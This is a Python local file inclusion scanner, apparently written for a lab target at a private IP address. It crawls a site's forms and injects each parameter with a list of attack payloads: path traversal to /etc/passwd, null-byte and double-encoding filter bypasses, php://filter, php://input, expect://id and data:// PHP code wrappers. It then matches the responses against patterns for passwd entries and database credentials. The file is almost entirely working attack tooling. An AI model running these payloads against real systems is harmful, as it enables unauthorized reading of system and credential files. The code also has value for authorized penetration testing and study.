import requests
from urllib.parse import urlparse, urlencode, urlunparse
import re
from bs4 import BeautifulSoup
import urllib.parse
import urllib3
from urllib.parse import urljoin, urlparse

# Suppress only the single specific warning from urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Login details
login_details = {"username": "test@test.com", "password": "testpassword"}

# Regular expressions for sensitive data
regex_patterns = [
    re.compile(r"root:x:\d+:\d+::/root:/bin/bash"),  # /etc/passwd
    re.compile(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,7}\b"),  # Email address
    re.compile(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b"),  # IP address
    re.compile(r"(?i)(database|db)_?(user|pass|name|host)?\s*[=:]\s*\S+"),  # Database credentials
    re.compile(r"(?i)uncaught exception"),  # Custom error messages
    re.compile(r"(?i)<b>Warning</b>: .+ on line <b>\d+</b>"),
    re.compile(r"/bin/sh"),
]

# List of payloads to test
payloads = [
    "/../../../../../../../etc/passwd", # Path traversal
    "/../../../../../../../etc/passwd%00", # Null byte injection
    "/../../../../../../../etc/passwd", # Path traversal
    "/../../../../../../../etc/passwd%00", # Null byte injection
    "..%252f..%252f..%252f..%252f..%252fetc%252fpasswd", # Double URL encoding
    "....//....//....//etc/passwd", # Filter bypass with extra slashes
    "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd", # Filter bypass with backslashes
    "../../../var/www/private/../../../etc/passwd", # Directory guessing
    "php://filter/convert.base64-encode/resource=/etc/passwd", # Base64 encoding
    "php://input", # Using POST parameters
    "expect://id", # Expect protocol
    "php://filter/convert.base64-encode/resource=index.php", # Base64 encoding of a PHP file
    "php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd", # PHP filter
    "php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd", # Compression + Base64
    "data://text/plain,<?php phpinfo(); ?>", # Data protocol
    "zip://shell.jpg%23payload.php", # Zip wrapper
    "../../../var/www/private/../../../etc/passwd", # Directory guessing
    "../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.", # Path truncation
    "../../../../[ADD MORE]../../../../../etc/passwd", # Path truncation
    "....//....//etc/passwd", # Filter bypass
    "..///////..////..//////etc/passwd", # Filter bypass
    "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd", # Filter bypass
    "/var/www/../../etc/passwd" # Maintain the initial path
]

def process_subdomains(subdomain):
    results = []
        
    # Fetch all pages' URLs
    all_urls = get_all_website_links(subdomain)

    for url in all_urls:
        try:
            response = requests.get(url, verify=False, timeout=10, allow_redirects=True)  # waits 10 seconds
        except requests.exceptions.RequestException as e:
            continue

        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')

        print(f"Found {len(forms)} forms on {url}")  # Debugging line

        for form in forms:
            result = {'url': url, 'form': {}, 'method': form.get('method', 'get').lower()}
            form_inputs = {}  # Initialize the dictionary

            for input in form.find_all(['input', 'textarea', 'select']):
                if input.get("name"):
                    form_inputs[input.get("name")] = input.get('value', '')

            action = form.get('action')
            if not urllib.parse.urlparse(action).netloc:
                action = urllib.parse.urljoin(url, action)
            elif action.startswith('//'):
                action = 'https:' + action

            result['form'] = {'action': action, 'params': form_inputs}  # Use form_inputs here
            results.append(result)
    return results

def test_lfi(results, payloads, regex_patterns):
    continue_looking = True  # Add a flag here

    for result in results:
        if not continue_looking:  # Check the flag at the beginning of the outer loop
            break
        print(f"Testing for LFI against {result}")
        # Loop over all form inputs
        for form_input in result["form"]["params"].keys():
            if not continue_looking:  # Check the flag at the beginning of the second outer loop
                break
            found_in_input = False  # Add a flag for the current form input
            # Loop over all payloads
            for payload in payloads:
                if not continue_looking:  # Check the flag at the beginning of the third outer loop
                    break
                if found_in_input:  # Check if LFI found in this form input
                    break
                params = result["form"]["params"].copy()
                params[form_input] = payload

                # Parse the URL and modify the query part
                parsed_url = list(urlparse(result["form"]["action"]))
                parsed_url[4] = urlencode(params)

                # Construct the full URL
                full_url = urlunparse(parsed_url)

                # Send the request
                try:
                    if result['method'] == 'get':
                        response = requests.get(full_url, headers=result["form"].get("headers"))
                    elif result['method'] == 'post':
                        response = requests.post(result["form"]["action"], data=params, headers=result["form"].get("headers"))
                    elif result['method'] == 'cookie':
                        # Construct the cookies dictionary
                        cookies = {form_input: payload}
                        response = requests.get(result["form"]["action"], cookies=cookies, headers=result["form"].get("headers"))
                    elif result['method'] == 'header':
                        # Construct the headers dictionary
                        headers = {form_input: payload}
                        response = requests.get(result["form"]["action"], headers=headers)
                    else:
                        print(f"Unsupported method {result['method']}, skipping.")
                        continue
                except requests.exceptions.RequestException as e:
                    print(f"Error sending {result['method'].upper()} request to {full_url}")
                    continue

                # Loop over all regex patterns
                for regex in regex_patterns:
                    if regex.search(response.text):
                        print(f"Potential LFI detected at {full_url} with payload '{payload}' in parameter '{form_input}'.")
                        choice = input("Do you want to continue looking? (y/n): ")
                        if choice.lower() != "y":
                            continue_looking = False  # Set the flag to False
                            break  # Break from the regex loop
                        else:
                            found_in_input = True  # Set the flag to True if LFI found and the user chooses to continue
                            break  # Break from the payloads loop

def is_valid(url):
    parsed = urlparse(url)
    return bool(parsed.netloc) and bool(parsed.scheme)

def get_all_website_links(url):
    urls = set()
    domain_name = urlparse(url).netloc

    soup = BeautifulSoup(requests.get(url).content, "html.parser")

    for a_tag in soup.findAll("a"):
        href = a_tag.attrs.get("href")
        if href == "" or href is None:
            continue

        href = urljoin(url, href)
        parsed_href = urlparse(href)
        href = parsed_href.scheme + "://" + parsed_href.netloc + parsed_href.path

        if not is_valid(href):
            continue
        if href in urls:  # This line checks if the URL has been processed before
            continue
        if domain_name not in href:
            continue

        urls.add(href)

    return urls

# Usage
subdomain = 'http://10.10.201.152'
results = process_subdomains(subdomain)
test_lfi(results, payloads, regex_patterns)
